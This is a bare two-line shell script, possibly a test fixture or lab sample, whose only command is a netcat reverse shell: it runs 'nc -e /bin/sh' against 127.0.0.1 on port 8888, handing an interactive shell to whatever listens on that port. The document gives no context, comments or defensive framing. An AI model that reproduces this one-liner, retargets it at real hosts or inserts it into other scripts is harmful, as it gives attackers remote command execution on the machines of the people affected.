#!/bin/sh
nc -e /bin/sh 127.0.0.1 8888
